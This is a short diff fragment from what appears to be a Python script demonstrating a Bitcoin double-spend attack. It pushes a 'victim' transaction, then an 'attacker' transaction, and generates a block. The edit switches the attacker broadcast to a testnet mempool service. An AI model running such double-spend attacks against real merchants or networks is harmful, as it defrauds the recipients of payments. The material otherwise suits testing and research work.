@@ -191,7 +191,7 @@ else:
     transaction_util.pushtx(tx_victim)
 # >>>> FRK BC EXE DSPND 0w0
 print()
-send_rawtransaction(tx_attacker)
+broadcast_mempool_space(tx_attacker, testnet)
 input("--- READY... --- ")
 print("generating block")
 generate_block(block)
